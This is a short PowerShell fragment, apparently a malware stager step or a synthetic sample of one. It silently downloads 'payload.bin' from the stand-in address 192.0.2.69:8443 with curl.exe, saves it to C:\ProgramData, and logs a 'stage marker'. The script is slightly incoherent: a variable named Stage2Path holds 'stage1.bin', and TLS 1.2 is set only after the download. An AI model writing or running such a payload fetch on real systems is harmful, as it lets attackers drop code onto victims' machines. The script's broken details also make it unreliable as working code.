$TransferUrl = "https://192.0.2.69:8443/payload.bin"
$Stage2Path = "C:\ProgramData\stage1.bin"
curl.exe -s -L -o $Stage2Path $TransferUrl
Write-Verbose "stage marker 24 reached"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
